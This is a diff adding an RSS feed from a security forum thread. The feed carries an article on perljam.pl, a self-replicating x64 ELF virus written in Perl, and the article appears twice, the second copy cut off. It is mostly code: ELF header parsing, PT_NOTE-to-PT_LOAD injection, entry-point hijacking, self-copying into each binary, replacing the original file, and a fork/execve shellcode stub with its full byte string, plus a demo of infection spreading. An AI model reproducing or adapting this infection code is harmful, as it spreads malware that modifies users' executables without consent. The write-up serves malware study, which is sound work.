@@ -1,0 +1,804 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Perljam.pl: A Perl x64 ELF virus</title>
+    <link>https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373</link>
+    <description>
+&lt;h2&gt;&lt;span&gt;[ intro ]&lt;/span&gt;&lt;/h2&gt;
+        &lt;p&gt;
+            EHLO. This article describes the implementation of perljam.pl, a proof-of-concept x64 ELF virus written in Perl based mostly on &lt;a href=&quot;https://www.guitmz.com/linux-midrashim-elf-virus/&quot; _target=&quot;_blank&quot;&gt;Linux.Midrashim&lt;/a&gt;. The virus includes the following features and limitations:
+          &lt;/p&gt;
+          &lt;ul&gt;
+            &lt;li&gt;It uses the PT_NOTE to PT_LOAD ELF injection technique.&lt;/li&gt;
+            &lt;li&gt;It uses a non-destructive hardcoded payload that prints an extract from the song &quot;release&quot; by Pearl Jam and then infects other binaries in the current directory.&lt;/li&gt;
+            &lt;li&gt;It works on regular and position independent binaries.&lt;/li&gt;
+            &lt;li&gt;It is written in Perl, an interpreted language available by default on most Linux x64 distributions.&lt;/li&gt;
+            &lt;li&gt;It does not implement any evasion or obfuscation techniques, making it trivial to detect.&lt;/li&gt;
+          &lt;/ul&gt;
+          &lt;p&gt;(This is a crosspost from my original article at &lt;b&gt;hckng&lt;/b&gt;. You can read it &lt;a href=&quot;https://hckng.org/articles/perljam-elf64-virus.html&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;
+          &lt;p&gt;Source code:&lt;/p&gt;
+          &lt;p&gt;
+            &lt;a href=&quot;https://git.sr.ht/~hckng/vx/tree/master/item/perljam.pl&quot; target=&quot;_blank&quot;&gt;https://git.sr.ht/~hckng/vx/tree/master/item/perljam.pl&lt;/a&gt;
+            &lt;br /&gt;
+            &lt;a href=&quot;https://github.com/ilv/vx/blob/main/perljam.pl&quot; target=&quot;blank&quot;&gt;https://github.com/ilv/vx/blob/main/perljam.pl (mirror)&lt;/a&gt;
+          &lt;/p&gt;
+          &lt;p&gt;
+            &lt;b&gt;IMPORTANT NOTE&lt;/b&gt;: perljam.pl was made for educational purposes only, I&#39;m not responsible for any misuse or damage caused by this program. Use it at your own  risk.
+          &lt;/p&gt;
+
+
+&lt;h2&gt;&lt;span&gt;[ part 1: infection ]&lt;/span&gt;&lt;/h2&gt;
+          &lt;p&gt;
+            The infection is performed using the well known &lt;a href=&quot;https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/&quot; target=&quot;_blank&quot;&gt;PT_NOTE to PT_LOAD&lt;/a&gt; technique which overwrites an auxiliary segment in the program headers table and  converts it into a loadable segment where executable instructions can be placed without affecting program execution. This method works both on regular and position independent binaries with the exception of golang executables that use PT_NOTE segment for storing data used during execution.
+          &lt;/p&gt;
+          &lt;p&gt;
+            The infection algorithm can be summarized as follows:
+          &lt;/p&gt;
+          &lt;ul&gt;
+            &lt;li&gt; a) Read the binary and parse its ELF header and program headers table.&lt;/li&gt;
+            &lt;li&gt; b) Calculate the address for loading a payload in memory.&lt;/li&gt;
+            &lt;li&gt; c) Change binary&#39;s entry point to the previous calculated address.&lt;/li&gt;
+            &lt;li&gt; d) Find a PT_NOTE segment and convert it to an executable PT_LOAD segment.&lt;/li&gt;
+            &lt;li&gt; e) Adjust PT_LOAD segment&#39;s virtual address, file size and memory size.&lt;/li&gt;
+            &lt;li&gt; f) Append payload after the binary&#39;s code.&lt;/li&gt;
+            &lt;li&gt; g) Calculate binary&#39;s original entry point relative to the new entry point.&lt;/li&gt;
+            &lt;li&gt; h) Append an instruction for jumping back to the binary&#39;s original entry point.&lt;/li&gt;
+            &lt;li&gt; i) Append the virus source code at the end of the binary.&lt;/li&gt;
+          &lt;/ul&gt;
+          &lt;p&gt;Relevant parts of the implementation will be discussed in the next sections.&lt;/p&gt;
+
+
+&lt;h3&gt;&lt;span&gt;[ read ELF binary and parse its headers ]&lt;/span&gt;&lt;/h3&gt;
+          &lt;p&gt;
+            The binary is opened with the &#39;:raw&#39; &lt;a href=&quot;https://perldoc.perl.org/PerlIO#:raw&quot; target=&quot;_blank&quot;&gt;pseudo-layer&lt;/a&gt; for passing binary data. Two helper subroutines are used for reading and writing content with the &lt;a href=&quot;https://perldoc.perl.org/functions/pack&quot; target=&quot;_blank&quot;&gt;unpack/pack&lt;/a&gt; functions:
+          &lt;/p&gt;
+
+```
+ # read &amp; unpack
+ sub ru {
+     my $fh  = shift;
+     my $tpl = shift;
+     my $sz  = shift;
+
+     read $fh, my $buff, $sz;
+     return unpack($tpl, $buff);
+ }
+
+ # write &amp; pack
+ sub wp {
+     my $fh   = shift;
+     my $tpl  = shift;
+     my $sz   = shift;
+     my @data = @_;
+
+     syswrite $fh, pack($tpl, @data), $sz;
+ }
+ [...]
+ open my $fh, &#39;&lt;:raw&#39;, $file;
+```
+
+&lt;p&gt;
+            The above subroutines use a given template ($tpl) for converting data from/to the binary. In this case the following templates are used:
+          &lt;/p&gt;
+          &lt;ul&gt;
+            &lt;li&gt;&quot;C&quot;, an unsigned char value (1 byte).&lt;/li&gt;
+            &lt;li&gt;&quot;a&quot;, a string with arbitrary binary data (1 byte).&lt;/li&gt;
+            &lt;li&gt;&quot;x&quot;, a null byte.&lt;/li&gt;
+            &lt;li&gt;&quot;S&quot;, an unsigned short value (2 bytes).&lt;/li&gt;
+            &lt;li&gt;&quot;I&quot;, an unsigned integer value (4 bytes).&lt;/li&gt;
+            &lt;li&gt;&quot;q&quot;, an unsigned quad value (8 bytes).&lt;/li&gt;
+          &lt;/ul&gt;
+          &lt;p&gt;
+            Based on the &lt;a href=&quot;https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html&quot; target=&quot;_blank&quot;&gt;ELF header specification&lt;/a&gt;, reading the binary&#39;s headers and checking the ELF magic numbers can be done as follows:
+          &lt;/p&gt;
+
+```
+ my @ehdr = ru($fh, &quot;C a a a C C C C C x7 S S I q q q I S S S S S S&quot;, 0x40);
+
+ # for clarity
+ my ($e_phoff, $e_phentsize, $e_phnum) = ($ehdr[13], $ehdr[17], $ehdr[18]);
+
+ # skip non ELFs
+ # $ehdr[i]  = ei_magi, 0 &lt;= i &lt;= 3
+ if($ehdr[0] != 127 &amp;&amp; $ehdr[1] !~ &quot;E&quot; &amp;&amp; $ehdr[2] !~ &quot;L&quot; &amp;&amp; $ehdr[3] !~ &quot;F&quot;) {
+      close $fh;
+      next;
+ }
+```
+          
+&lt;br /&gt;
+&lt;h3&gt;&lt;span&gt;[ calculate address and change entry point ]&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;
+According to &lt;a href=&quot;https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/&quot; target=&quot;_blank&quot;&gt;this&lt;/a&gt;, the new entry point of the injected payload must be an address far beyond the end of the original program in order to avoid overlap. For simplicity, the value 0xc000000 plus the size of the binary is chosen and then the modified headers are copied into a temporary binary.
+&lt;/p&gt;
+ 
+```
+ # file size
+ my $file_sz = (stat $file)[7];
+ [...]
+ my $far_addr = 0xc000000;
+ $ne_entry = $far_addr + $file_sz;
+ $oe_entry = $ehdr[12];
+ $ehdr[12] = $ne_entry;
+
+ # create tmp file for copying the modified binary
+ open my $fh_tmp, &#39;&gt;:raw&#39;, &quot;$file.tmp&quot;;
+ wp($fh_tmp, &quot;C a a a C C C C C x7 S S I q q q I S S S S S S&quot;, 0x40, @ehdr);
+```
+
+&lt;br /&gt;
+&lt;h3&gt;&lt;span&gt;[ convert PT_NOTE to PT_LOAD and adjust values ]&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;
+Next, in order to parse the entries of the program headers table the binary is read on chuncks based on the values $e_phoff, $e_phnum and $e_phentsize obtained from the binary&#39;s ELF header. Reference for the expected headers values can be found at the &lt;a href=&quot;https://refspecs.linuxbase.org/elf/gabi4+/ch5.pheader.html&quot; target=&quot;_blank&quot;&gt;Program Header specification&lt;/a&gt;:
+&lt;/p&gt;
+
+```
+ seek $fh, $e_phoff, &quot;SEEK_SET&quot;;
+ seek $fh_tmp, $e_phoff, &quot;SEEK_SET&quot;;
+
+ # inject the first PT_NOTE segment found
+ my $found_ptnote = 0;
+ for (my $i = 0; $i &lt; $e_phnum; $i++) {
+     #
+     # read program header
+     # see https://refspecs.linuxbase.org/elf/gabi4+/ch5.pheader.html
+     my @phdr = ru($fh, &quot;I I q q q q q q&quot;, $e_phentsize);
+     [...]
+     wp($fh_tmp, &quot;I I q q q q q q&quot;, $e_phentsize, @phdr);
+ }
+```
+
+&lt;p&gt;
+            When a segment of p_type 4 is found (PT_NOTE) the entries values are modified as follows:
+          &lt;/p&gt;
+          &lt;ul&gt;
+            &lt;li&gt;p_type    = 1 (for converting it to PT_LOAD)&lt;/li&gt;
+            &lt;li&gt;p_flags   = 5 (for making it executable)&lt;/li&gt;
+            &lt;li&gt;p_offset  = $file_sz; (offset to end of binary, where payload will be appended)&lt;/li&gt;
+            &lt;li&gt;p_vaddr   = $ne_entry (the new entry point calculated above)&lt;/li&gt;
+            &lt;li&gt;p_filesz += payload size + 5 + virus size (payload + jmp + virus)&lt;/li&gt;
+            &lt;li&gt;p_memsz  += payload size + 5 + virus size (payload + jmp + virus)&lt;/li&gt;
+            &lt;li&gt;p_align   = 2mb (based on [x])&lt;/li&gt;
+          &lt;/ul&gt;
+
+
+&lt;h3&gt;&lt;span&gt;[ append payload ]&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;
+After parsing the entries of the program headers table, the rest of the binary is copied without change, followed by the hardcoded payload (the process of adjusting the payload will be described in part 2).
+&lt;/p&gt;
+
+```
+ # copy rest of file&#39;s content
+ syswrite $fh_tmp, $_ while(&lt;$fh&gt;);
+
+ #
+ # append payload
+ #
+ syswrite $fh_tmp, $payload_prefix;
+ [...]
+ # adjust payload
+ [...]
+ syswrite $fh_tmp, $payload_suffix;
+```
+
+&lt;h3&gt;&lt;span&gt;[ calculate relative entry point and append jump instruction ]&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;
+            The binary&#39;s original entry point relative to the entry point of the injected payload is calculated using the formula described in &lt;a href=&quot;https://www.guitmz.com/linux-midrashim-elf-virus/&quot; target=&quot;_blank&quot;&gt;Linux.Midrashim&lt;/a&gt;:
+&lt;/p&gt;
+
+&gt; newEntryPoint = originalEntryPoint - (p_vaddr + 5) - virus_size
+
+&lt;p&gt;The jump instruction is then appended using such value:&lt;/p&gt;
+
+```
+$ne_entry = $oe_entry - ($ne_entry + 5) - $payload_sz;
+# 4 bytes only
+$ne_entry = $ne_entry &amp; 0xffffffff;
+wp($fh_tmp, &quot;C q&quot;, 0x9, (0xe9, $ne_entry));
+```
+&lt;h3&gt;&lt;span&gt;[ append virus ]&lt;/span&gt;&lt;/h3&gt;
+ &lt;p&gt;
+To achieve replication, perljamp.pl source code must be appended to the infected binary. To carry out this task, the virus should open itself (using the predefined variable $0) and append its content after the jump instruction. Note that if perljam.pl is executed from an infected binary then a search for the string &quot;&lt;i&gt;#!/usr/bin/perl&lt;/i&gt;&quot; must be performed to ensure that only the source code of the virus is copied and not the content of the binary. The virus source code is read before the main loop and it&#39;s written on each infection.
+ &lt;/p&gt;
+
+```
+ #
+ # virus code
+ #
+ # search for &#39;#!/usr/bin/perl&#39; first to avoid copying extra data
+ my $vx;
+ open my $fh_vx, &#39;&lt;&#39;, $0;
+ while(&lt;$fh_vx&gt;) {
+    last if($_ =~ q(#!/usr/bin/perl));
+ }
+ $vx  = &quot;#!/usr/bin/perl\n&quot;;
+ $vx .= $_ while(&lt;$fh_vx&gt;);
+ close $fh_vx;
+ # virus size
+ my $vx_sz = length($vx);
+
+ [...]
+ [...]
+
+ #
+ # append virus code
+ #
+ syswrite $fh_tmp, &quot;\n&quot;.$vx;
+```
+
+&lt;h3&gt;&lt;span&gt;[ overwrite binary ]&lt;/span&gt;&lt;/h3&gt;
+ &lt;p&gt;At this point the virus has created an infected copy of the binary. The final step is to delete the original binary and replace it with the infected copy.
+&lt;/p&gt;
+
+```
+ close $fh;
+ close $fh_tmp;
+
+ # replace original binary with tmp copy
+ unlink $file;
+ copy(&quot;$file.tmp&quot;, $file);
+ unlink &quot;$file.tmp&quot;;
+ chmod 0755, $file;
+```
+
+&lt;br /&gt;
+&lt;h2&gt;&lt;span&gt;[ part 2: payload &amp; replication ]&lt;/span&gt;&lt;/h2&gt;
+ &lt;p&gt;
+The harcoded payload consists of two combined shellcodes. The first one prints to stdout an extract from the song &quot;release&quot; by Pearl Jam. The second one performs the virus replication by running the infected binary as a perl script. For this the perl interpreter must be executed using the -x switch, which according to &lt;a href=&quot;https://perldoc.perl.org/perlrun#-x&quot; target=&quot;_blank&quot;&gt;Perl&#39;s documentation&lt;/a&gt;:
+&lt;/p&gt;
+
+&gt; tells Perl that the program is embedded in a larger chunk of unrelated text, such as in a mail message. Leading garbage will be discarded until the first line that starts with #! and contains the string &quot;perl&quot;
+ 
+&lt;p&gt;Therefore, an execve syscall for &quot;&lt;i&gt;/usr/bin/perl -x infected_binary&lt;/i&gt;&quot; will run the perljam.pl source code embedded in the infected binary. This syscall must be  invoked inside a child process (fork) to prevent the interruption of the original program code.
+ &lt;/p&gt;
+
+&lt;p&gt;
+However, the &quot;infected_binary&quot; (filename) argument in the execve syscall needs to change on each infection according to the binary&#39;s filename. To achieve this an initial version of the assembly code is compiled using a fixed string of length 255 (maximum filename length on Linux) as the filename argument. This string will be replaced later.
+&lt;/p&gt;
+
+&lt;p&gt;The following assembly code combines the two shellcodes mentioned before:&lt;/p&gt;
+
+```
+BITS 64
+global _start
+section .text
+_start:
+    call main
+    db &quot;i am myself, like you somehow&quot;, 0xa, 0x0
+    db &quot;/usr/bin/perl&quot;, 0x0
+    db &quot;-x&quot;, 0x0
+    db &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;
+    db &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;
+    db &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;
+    db &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;, 0x0
+    
+ main:
+    ;;;;;;;;;;;;
+    ; print msg
+    ;;;;;;;;;;;;
+    xor rax, rax
+    xor rdx, rdx
+    inc al
+    mov rdi, rax
+    pop rsi
+    mov dl, 30
+    syscall
+
+    ;;;;;;;;
+    ; fork
+    ;;;;;;;;
+    xor rax, rax
+    mov rax, 57
+    syscall
+    test eax, eax
+    jne parent
+
+    ;;;;;;;;;;;;;;;;;;;;;;;;;
+    ; call perl interpreter
+    ;;;;;;;;;;;;;;;;;;;;;;;;;
+
+    ; filename &quot;/usr/bin/perl&quot;
+    lea rdi, [rsi+31]   
+    
+    ; argv
+    ; [&quot;/usr/bin/perl&quot;, &quot;-x&quot;, &quot;xxxxx...&quot;] (on reverse)
+    xor rdx, rdx
+    push rdx
+    lea rbx, [rsi+48] ; &quot;xxx...&quot;
+    push rbx
+    lea rbx, [rsi+45] ; &quot;-x&quot;
+    push rbx
+    push rdi          ; &quot;/usr/bin/perl&quot;
+    mov rsi, rsp 
+
+    ; execve &amp; exit
+    xor rax, rax
+    mov rax, 59
+    mov rdx, 0
+    syscall
+    xor rdx, rdx
+    mov rax, 60
+    syscall
+
+ parent:
+    ; cleanup for the jmp instruction
+    xor rax, rax
+    xor rdx, rdx
+```
+
+&lt;p&gt;The code is then compiled to extract its hexadecimal representation.&lt;/p&gt;
+
+&gt;  $ nasm -f elf64 -o perljam.o perljam.s
+&gt; $ objdump -d perljam.o
+
+&lt;p&gt; After this, the harcoded payload is generated by removing the hexadecimal representation of the fixed string (\x78 * 255) and then splitting the remaining shellcode in two: before and after the fixed string.
+&lt;/p&gt;
+
+```
+my ($payload_prefix, $payload_suffix);
+$payload_prefix  = &quot;\xe8\x30\x01\x00\x00\x69\x20\x61\x6d\x20\x6d\x79\x73\x65&quot;;
+$payload_prefix .= &quot;\x6c\x66\x2c\x20\x6c\x69\x6b\x65\x20\x79\x6f\x75\x20\x73&quot;;
+$payload_prefix .= &quot;\x6f\x6d\x65\x68\x6f\x77\x0a\x00\x2f\x75\x73\x72\x2f\x62&quot;;
+$payload_prefix .= &quot;\x69\x6e\x2f\x70\x65\x72\x6c\x00\x2d\x78\x00&quot;;
+
+$payload_suffix  = &quot;\x00\x48\x31\xc0\x48\x31\xd2\xfe\xc0\x48\x89\xc7\x5e\xb2&quot;;
+$payload_suffix .= &quot;\x1e\x0f\x05\x48\x31\xc0\xb8\x39\x00\x00\x00\x0f\x05\x85&quot;;
+$payload_suffix .= &quot;\xc0\x75\x2f\x48\x8d\x7e\x1f\x48\x31\xd2\x52\x48\x8d\x5e&quot;;
+$payload_suffix .= &quot;\x30\x53\x48\x8d\x5e\x2d\x53\x57\x48\x89\xe6\x48\x31\xc0&quot;;
+$payload_suffix .= &quot;\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x31&quot;;
+$payload_suffix .= &quot;\xd2\xb8\x3c\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x31\xd2&quot;;
+```
+
+&lt;p&gt;
+The payload is adjusted on each infection by inserting the hexadecimal representation of the infected binary&#39;s filename plus N null bytes, where:
+&lt;/p&gt;
+
+&gt; N = 255 - length(infected binary&#39;s filename)
+
+&lt;p&gt;
+Filling with N null bytes after the infected binary&#39;s filename ensures that the payload will not crash on runtime, since adding or removing bytes will break the shellcode. In addition, the first null byte located after the infected binary&#39;s filename will be interpreted by the machine as the end of the string and the remaining null values will be ignored.
+&lt;/p&gt;
+
+&lt;p&gt;
+            The adjustment can be done as follows:
+&lt;/p&gt;
+
+```
+ syswrite $fh_tmp, $payload_prefix;
+ # adjust payload with target&#39;s filename
+ my @chars = split //, $file;
+ for(my $i = 0; $i &lt; length($file); $i++) {
+     wp($fh_tmp, &quot;C&quot;, 0x1, (hex unpack(&quot;H2&quot;, $chars[$i])));
+ } 
+ # fill with null values
+ for(my $i = length($file); $i &lt; 255; $i++) {
+     wp($fh_tmp, &quot;C&quot;, 0x1, (0x00));
+ }
+ syswrite $fh_tmp, $payload_suffix;
+```
+
+&lt;br /&gt;
+&lt;h2&gt;&lt;span&gt;[ part 3: run ]&lt;/span&gt;&lt;/h2&gt;
+          
+
+&lt;p&gt;To run:&lt;/p&gt;
+
+&gt; $ perl perljam.pl
+
+&lt;p&gt;Example:&lt;/p&gt;
+
+```
+ $ cp /bin/id .
+ $ ./id
+ uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
+ $ perl perljam.pl
+ $ ./id
+ i am myself, like you somehow
+ uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
+ $ cp /bin/id id2
+ $ ./id2
+ uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
+ $ ./id
+ i am myself, like you somehow
+ uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
+ $ ./id2
+ i am myself, like you somehow
+ uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
+```</description>
+    
+    <lastBuildDate>Tue, 10 Oct 2023 09:44:49 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Perljam.pl: A Perl x64 ELF virus</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373/4</link>
+        <pubDate>Mon, 11 Dec 2023 06:20:57 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-36373-4</guid>
+        <source url="https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373.rss">Perljam.pl: A Perl x64 ELF virus</source>
+      </item>
+      <item>
+        <title>Perljam.pl: A Perl x64 ELF virus</title>
+        <dc:creator><![CDATA[C1ph3rpunk]]></dc:creator>
+        <description><![CDATA[
+            <p>Very interesting, this could also theoretically be done on windows through side loading right?</p>
+          <p><a href="https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373/2</link>
+        <pubDate>Sat, 30 Sep 2023 21:16:47 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-36373-2</guid>
+        <source url="https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373.rss">Perljam.pl: A Perl x64 ELF virus</source>
+      </item>
+      <item>
+        <title>Perljam.pl: A Perl x64 ELF virus</title>
+        <dc:creator><![CDATA[isra]]></dc:creator>
+        <description><![CDATA[
+            <h2><span>[ intro ]</span></h2>
+        <p>
+            EHLO. This article describes the implementation of perljam.pl, a proof-of-concept x64 ELF virus written in Perl based mostly on <a href="https://www.guitmz.com/linux-midrashim-elf-virus/" rel="noopener nofollow ugc">Linux.Midrashim</a>. The virus includes the following features and limitations:
+          </p>
+          <ul>
+            <li>It uses the PT_NOTE to PT_LOAD ELF injection technique.</li>
+            <li>It uses a non-destructive hardcoded payload that prints an extract from the song "release" by Pearl Jam and then infects other binaries in the current directory.</li>
+            <li>It works on regular and position independent binaries.</li>
+            <li>It is written in Perl, an interpreted language available by default on most Linux x64 distributions.</li>
+            <li>It does not implement any evasion or obfuscation techniques, making it trivial to detect.</li>
+          </ul>
+          <p>(This is a crosspost from my original article at <b>hckng</b>. You can read it <a href="https://hckng.org/articles/perljam-elf64-virus.html" target="_blank" rel="noopener nofollow ugc">here</a>).</p>
+          <p>Source code:</p>
+          <p>
+            <a href="https://git.sr.ht/~hckng/vx/tree/master/item/perljam.pl" target="_blank" rel="noopener nofollow ugc">https://git.sr.ht/~hckng/vx/tree/master/item/perljam.pl</a>
+            <br>
+            <a href="https://github.com/ilv/vx/blob/main/perljam.pl" rel="noopener nofollow ugc">https://github.com/ilv/vx/blob/main/perljam.pl (mirror)</a>
+          </p>
+          <p>
+            <b>IMPORTANT NOTE</b>: perljam.pl was made for educational purposes only, I'm not responsible for any misuse or damage caused by this program. Use it at your own  risk.
+          </p>
+<h2><span>[ part 1: infection ]</span></h2>
+          <p>
+            The infection is performed using the well known <a href="https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/" target="_blank" rel="noopener nofollow ugc">PT_NOTE to PT_LOAD</a> technique which overwrites an auxiliary segment in the program headers table and  converts it into a loadable segment where executable instructions can be placed without affecting program execution. This method works both on regular and position independent binaries with the exception of golang executables that use PT_NOTE segment for storing data used during execution.
+          </p>
+          <p>
+            The infection algorithm can be summarized as follows:
+          </p>
+          <ul>
+            <li> a) Read the binary and parse its ELF header and program headers table.</li>
+            <li> b) Calculate the address for loading a payload in memory.</li>
+            <li> c) Change binary's entry point to the previous calculated address.</li>
+            <li> d) Find a PT_NOTE segment and convert it to an executable PT_LOAD segment.</li>
+            <li> e) Adjust PT_LOAD segment's virtual address, file size and memory size.</li>
+            <li> f) Append payload after the binary's code.</li>
+            <li> g) Calculate binary's original entry point relative to the new entry point.</li>
+            <li> h) Append an instruction for jumping back to the binary's original entry point.</li>
+            <li> i) Append the virus source code at the end of the binary.</li>
+          </ul>
+          <p>Relevant parts of the implementation will be discussed in the next sections.</p>
+<h3><span>[ read ELF binary and parse its headers ]</span></h3>
+          <p>
+            The binary is opened with the ':raw' <a href="https://perldoc.perl.org/PerlIO#:raw" target="_blank" rel="noopener nofollow ugc">pseudo-layer</a> for passing binary data. Two helper subroutines are used for reading and writing content with the <a href="https://perldoc.perl.org/functions/pack" target="_blank" rel="noopener nofollow ugc">unpack/pack</a> functions:
+          </p>
+<pre><code class="lang-auto"> # read &amp; unpack
+ sub ru {
+     my $fh  = shift;
+     my $tpl = shift;
+     my $sz  = shift;
+
+     read $fh, my $buff, $sz;
+     return unpack($tpl, $buff);
+ }
+
+ # write &amp; pack
+ sub wp {
+     my $fh   = shift;
+     my $tpl  = shift;
+     my $sz   = shift;
+     my @data = @_;
+
+     syswrite $fh, pack($tpl, @data), $sz;
+ }
+ [...]
+ open my $fh, '&lt;:raw', $file;
+</code></pre>
+<p>
+            The above subroutines use a given template ($tpl) for converting data from/to the binary. In this case the following templates are used:
+          </p>
+          <ul>
+            <li>"C", an unsigned char value (1 byte).</li>
+            <li>"a", a string with arbitrary binary data (1 byte).</li>
+            <li>"x", a null byte.</li>
+            <li>"S", an unsigned short value (2 bytes).</li>
+            <li>"I", an unsigned integer value (4 bytes).</li>
+            <li>"q", an unsigned quad value (8 bytes).</li>
+          </ul>
+          <p>
+            Based on the <a href="https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html" target="_blank" rel="noopener nofollow ugc">ELF header specification</a>, reading the binary's headers and checking the ELF magic numbers can be done as follows:
+          </p>
+<pre><code class="lang-auto"> my @ehdr = ru($fh, "C a a a C C C C C x7 S S I q q q I S S S S S S", 0x40);
+
+ # for clarity
+ my ($e_phoff, $e_phentsize, $e_phnum) = ($ehdr[13], $ehdr[17], $ehdr[18]);
+
+ # skip non ELFs
+ # $ehdr[i]  = ei_magi, 0 &lt;= i &lt;= 3
+ if($ehdr[0] != 127 &amp;&amp; $ehdr[1] !~ "E" &amp;&amp; $ehdr[2] !~ "L" &amp;&amp; $ehdr[3] !~ "F") {
+      close $fh;
+      next;
+ }
+</code></pre>
+<br>
+<h3><span>[ calculate address and change entry point ]</span></h3>
+<p>
+According to <a href="https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/" target="_blank" rel="noopener nofollow ugc">this</a>, the new entry point of the injected payload must be an address far beyond the end of the original program in order to avoid overlap. For simplicity, the value 0xc000000 plus the size of the binary is chosen and then the modified headers are copied into a temporary binary.
+</p>
+<pre><code class="lang-auto"> # file size
+ my $file_sz = (stat $file)[7];
+ [...]
+ my $far_addr = 0xc000000;
+ $ne_entry = $far_addr + $file_sz;
+ $oe_entry = $ehdr[12];
+ $ehdr[12] = $ne_entry;
+
+ # create tmp file for copying the modified binary
+ open my $fh_tmp, '&gt;:raw', "$file.tmp";
+ wp($fh_tmp, "C a a a C C C C C x7 S S I q q q I S S S S S S", 0x40, @ehdr);
+</code></pre>
+<br>
+<h3><span>[ convert PT_NOTE to PT_LOAD and adjust values ]</span></h3>
+<p>
+Next, in order to parse the entries of the program headers table the binary is read on chuncks based on the values $e_phoff, $e_phnum and $e_phentsize obtained from the binary's ELF header. Reference for the expected headers values can be found at the <a href="https://refspecs.linuxbase.org/elf/gabi4+/ch5.pheader.html" target="_blank" rel="noopener nofollow ugc">Program Header specification</a>:
+</p>
+<pre><code class="lang-auto"> seek $fh, $e_phoff, "SEEK_SET";
+ seek $fh_tmp, $e_phoff, "SEEK_SET";
+
+ # inject the first PT_NOTE segment found
+ my $found_ptnote = 0;
+ for (my $i = 0; $i &lt; $e_phnum; $i++) {
+     #
+     # read program header
+     # see https://refspecs.linuxbase.org/elf/gabi4+/ch5.pheader.html
+     my @phdr = ru($fh, "I I q q q q q q", $e_phentsize);
+     [...]
+     wp($fh_tmp, "I I q q q q q q", $e_phentsize, @phdr);
+ }
+</code></pre>
+<p>
+            When a segment of p_type 4 is found (PT_NOTE) the entries values are modified as follows:
+          </p>
+          <ul>
+            <li>p_type    = 1 (for converting it to PT_LOAD)</li>
+            <li>p_flags   = 5 (for making it executable)</li>
+            <li>p_offset  = $file_sz; (offset to end of binary, where payload will be appended)</li>
+            <li>p_vaddr   = $ne_entry (the new entry point calculated above)</li>
+            <li>p_filesz += payload size + 5 + virus size (payload + jmp + virus)</li>
+            <li>p_memsz  += payload size + 5 + virus size (payload + jmp + virus)</li>
+            <li>p_align   = 2mb (based on [x])</li>
+          </ul>
+<h3><span>[ append payload ]</span></h3>
+<p>
+After parsing the entries of the program headers table, the rest of the binary is copied without change, followed by the hardcoded payload (the process of adjusting the payload will be described in part 2).
+</p>
+<pre><code class="lang-auto"> # copy rest of file's content
+ syswrite $fh_tmp, $_ while(&lt;$fh&gt;);
+
+ #
+ # append payload
+ #
+ syswrite $fh_tmp, $payload_prefix;
+ [...]
+ # adjust payload
+ [...]
+ syswrite $fh_tmp, $payload_suffix;
+</code></pre>
+<h3><span>[ calculate relative entry point and append jump instruction ]</span></h3>
+<p>
+            The binary's original entry point relative to the entry point of the injected payload is calculated using the formula described in <a href="https://www.guitmz.com/linux-midrashim-elf-virus/" target="_blank" rel="noopener nofollow ugc">Linux.Midrashim</a>:
+</p>
+<blockquote>
+<p>newEntryPoint = originalEntryPoint - (p_vaddr + 5) - virus_size</p>
+</blockquote>
+<p>The jump instruction is then appended using such value:</p>
+<pre><code class="lang-auto">$ne_entry = $oe_entry - ($ne_entry + 5) - $payload_sz;
+# 4 bytes only
+$ne_entry = $ne_entry &amp; 0xffffffff;
+wp($fh_tmp, "C q", 0x9, (0xe9, $ne_entry));
+</code></pre>
+<h3><span>[ append virus ]</span></h3>
+ <p>
